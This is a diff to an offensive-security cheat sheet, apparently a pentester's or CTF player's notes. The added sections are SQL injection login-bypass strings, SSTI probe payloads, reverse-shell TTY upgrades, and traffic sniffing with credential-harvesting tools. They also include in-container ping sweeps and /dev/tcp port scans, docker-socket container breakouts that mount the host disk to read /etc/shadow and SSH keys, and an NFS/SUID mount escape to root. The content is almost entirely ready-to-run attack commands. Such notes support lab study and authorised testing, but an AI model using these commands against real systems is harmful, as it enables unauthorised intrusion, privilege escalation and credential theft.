@@ -2684,6 +2684,7 @@ sqlmap [CURL_QUERY + APPEND * TO PARAM TO TEST]
 -v 3
 
 # DB Enumeration
+--smart							# Runs euristics
 --schema 						# Table structure
 --search [ -T, -C] <string>		# search as LIKE operator in table, col
 --dump -D <db> -T <table>		# Dump a table
@@ -2775,7 +2776,7 @@ ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.t
 
 - **Login Bypass**
 
-  `random' or 1=1-- -` or `random' or 1=1-- -`
+  `random' or 1=1-- -` with `'` `"` `` ` ``
 
 - **Union Injection**
 
@@ -2888,6 +2889,14 @@ If an SSTI exists, after submitting one of these:
 the web server will detect these expressions as valid code and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.
 
 An error message can indicate what is the engine used, one can then perform research on how to exploit the particular template.
+
+Confirmation
+
+- `<%'${{/#{@}}%>{{`
+- `{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}[7*7]${{<%[%'"}}%\`
+- Errors / Reflection → Check Template Documentation + Exploits
+
+[Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 ### Client-side
 
@@ -3162,6 +3171,25 @@ scp [FILE] user@targethost:[OUTPUT LOCATION]
 ```
 
 ### Shells & Payloads
+
+#### TTY upgrade
+
+- General method (if python is not installed)
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+- Python method (try different python versions)
+
+```bash
+# In reverse shell
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
+
+# Follow-Up
+$ CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=scr
+# Type 'xterm' if it asks for teminal type
+```
 
 #### Bash / Netcat payloads
 
@@ -4509,6 +4537,15 @@ Directories & Files Worth Checking:
       ls -la /var/mail /var/backups /var/spool /mnt /var/tmp
       ```
   
+- Traffic sniffing (if tcpdump installed)
+
+  ```bash
+  tcpdump -i [NIC] -nn -s0 -v port [PORT] -w [OUT_PCAP]
+  ```
+  
+  -  [net-creds](https://github.com/DanMcInerney/net-creds)
+  -  [PCredz](https://github.com/lgandx/PCredz)
+  
 - Service Config Files
 
   ```bash
@@ -4544,7 +4581,7 @@ Directories & Files Worth Checking:
 
 - Shadow Hashes `/etc/shadow` 
 
-### Local Network Services
+### Network Services
 
 ```bash
 netstat -tulnap | grep "LISTEN\|ENSTABILISHED"
@@ -4553,7 +4590,7 @@ netstat -tulnap | grep "LISTEN\|ENSTABILISHED"
 - `LISTEN`&rarr; Pivot
 - `ENSTABLISHED`&rarr;Connect to / config files
 
-**Look for sockets:**
+**Sockets:**
 
 ```bash
 netstat -a -p --unix		# See if there is a docker
@@ -4568,6 +4605,15 @@ find / -iname "docker.sock" 2>/dev/null	# Look for write permission
   ```bash
    docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
   ```
+
+**NFS exports**
+
+```bash
+cat /etc/exports
+```
+
+- **no_root_squash**, then you can access it from as a client and write inside that directory as if you were the local root of the machine. 
+- **no_all_squash** allows to emulate a non-root user
 
 #### Databases
 
@@ -4715,36 +4761,69 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 
 ### Docker Breakout
 
-To check if you are in a docker container type `hostname`. A docker has a random string as hostname.
+To check if you are in a docker container type `hostname`. A docker has a random string as hostname. Check [Docker Breakout](https://juggernaut-sec.com/docker-breakout-lpe/)
 
-- If you are root you can read the shadow password file `/etc/shadow`
+#### Enumeration
 
-- Search for sockets:
+```bash
+# MOUNTED FILE (common with father machine)
+lsblk	# Get mounted devices
+mount -l | grep <device>	# Check folders/writable files
+
+# NETWORK SCAN
+ifconfig
+# Local ping sweep
+for i in {1..255} ;do (ping -c 1 [INTRANET_CIDR_BLOCK].$i | grep "bytes from"|cut -d ' ' -
+f4|tr -d ':' &);done
+# Locan port scan
+for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/[INTRANET_IP]/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+for port in {1..65535}; do echo > /dev/tcp/[IP]/$port && echo "$port open"; done 2>/dev/null
+```
+
+Search for sockets:
+
+```bash
+find / -name docker.sock 2>/dev/null # Usually in /run/docker.sock
+```
+
+- If it is in `/run/docker.sock`:
 
   ```bash
-  find / -name docker.sock 2>/dev/null # Usually in /run/docker.sock
+  #List images to use one
+  docker images
+  #Run the image mounting the host disk and chroot on it
+  docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
   ```
 
-  - If it is in `/run/docker.sock`:
+- Otherwise use [docker bin32](https://get.docker.com/builds/Linux/i386/docker-latest.tgz) / [docker_bin_64](https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz) (upload if not installed)
 
-    ```bash
-    #List images to use one
-    docker images
-    #Run the image mounting the host disk and chroot on it
-    docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
-    ```
+  ```bash
+  # Create privileged container
+  /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+  # List containers -> get ID of the new container
+  /tmp/docker -H unix:///app/docker.sock ps	
+  # Log in the container
+  /tmp/docker -H unix:///app/docker.sock exec -it <id> /bin/bash
+  # Get SSH key, /etc/shadow...
+  ```
 
-  - Otherwise use [docker bin32](https://get.docker.com/builds/Linux/i386/docker-latest.tgz) / [docker_bin_64](https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz) (upload if not installed)
+#### ROOT
 
-    ```bash
-    # Create privileged container
-    /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
-    # List containers -> get ID of the new container
-    /tmp/docker -H unix:///app/docker.sock ps	
-    # Log in the container
-    /tmp/docker -H unix:///app/docker.sock exec -it <id> /bin/bash
-    # Get SSH key, /etc/shadow...
-    ```
+- `cat /etc/shadow`  → Shadow Hash Cracking
+
+- **Mount Escape** (from escaped user to root)
+
+  1. Check / create mounted (i.e. shared) folders 
+
+     - Check: See enumeration
+
+     - Create:
+
+       `mkdir /mnt/host`  → `mount [HOST_DISK] /mnt/host`  
+
+  2. Copy  bash/find... inside the mounted folder and give SUID to it
+
+  3. Execute the payload from User Host that can access the mounted folder
 
 ## Windows
 
